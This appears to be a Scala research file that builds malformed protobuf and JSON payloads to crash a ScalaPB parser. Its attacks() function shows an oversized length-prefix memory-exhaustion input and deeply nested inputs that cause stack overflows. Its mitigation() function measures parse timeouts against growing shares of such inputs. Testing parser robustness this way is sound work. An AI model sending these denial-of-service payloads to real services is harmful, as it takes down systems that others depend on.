package com.acme.protocolchaos

import java.io.{ByteArrayInputStream, InputStream}

import com.trueaccord.scalapb.json.JsonFormat

import scala.collection.mutable.ArrayBuffer
import scala.concurrent.{Await, Future, TimeoutException}
import scala.util.{Failure, Success, Try}

object Malicious {

  class PaddingInputStream(is: InputStream) extends InputStream {
    override def read(): Int = {
      val r = is.read()
      if (r != -1)
        r
      else {
        65
      }
    }
  }

  def main(args: Array[String]): Unit = {
    import Utils._
    val x = X(count = 1, greeting = "123")
    val b = x.toByteArray
    println(escape(b))

    def attacks(): Unit = {

      // OOM
      {
        val b = Array[Byte](8, 1, 18, -1, -1, -1, 4)
        val mb = Array.fill(b.length + 10485759)(65.toByte)
        Array.copy(b, 0, mb, 0, b.length)

        val inFlight: ArrayBuffer[X] = ArrayBuffer()

        for (c ← 0 to 200) {
          val x = X.parseFrom(mb)
          inFlight += x
          println(c)
        }
      }

      // SO
      val s = """{"x":""" * 1863
      JsonFormat.fromJsonString[X](s)

      // SO
      val bp = Array.fill(5380)(99.toByte)
      Array.copy(b, 0, bp, 0, b.length)
      println(X.validate(bp))
      val xp = X.parseFrom(new ByteArrayInputStream(bp))
      println(xp)
    }

    def mitigation(): Unit = {
      import scala.concurrent.duration._
      import scala.concurrent.ExecutionContext.Implicits.global

      val count = 1000
      val mb = Array.fill(20000)(99.toByte)
      Array.copy(b, 0, mb, 0, b.length)
      val to = 100.milliseconds

      System.setErr(null)
      val goodB = List.fill(count)(b)
      val (_, t) = time {
        goodB.foreach(X.parseFrom)
      }
      println(s"all good raw: $t")

      for (i ← 0 to 50) {
        val evilRate = i / 50.0
        val goodCount = if (i == 0) count else ((1 - evilRate) * count.toDouble).toInt
        val malCount  = if (i == 0) 0 else (evilRate * count).toInt
        val goodB = (1 to goodCount).map(_ ⇒ b)
        val malB = (1 to malCount).map(_ ⇒ mb)
        val bs = goodB ++ malB

        val ((c, ef, nef), t) = time {
          var c = 0
          var ef = 0
          var nef = 0
          bs.foreach { b ⇒
            Try(Await.result(Future(X.parseFrom(b)), to)) match {
              case Failure(_: TimeoutException) ⇒ ef += 1
              case Failure(ex) ⇒
                println(ex.toString)
                nef += 1
              case Success(_) ⇒ c += 1
            }
          }
          (c, ef, nef)
        }
        println(s"**** $evilRate: $c successes, $ef expected failures, $nef not-exepected failures took $t")
      }
    }


    mitigation()
  }

}
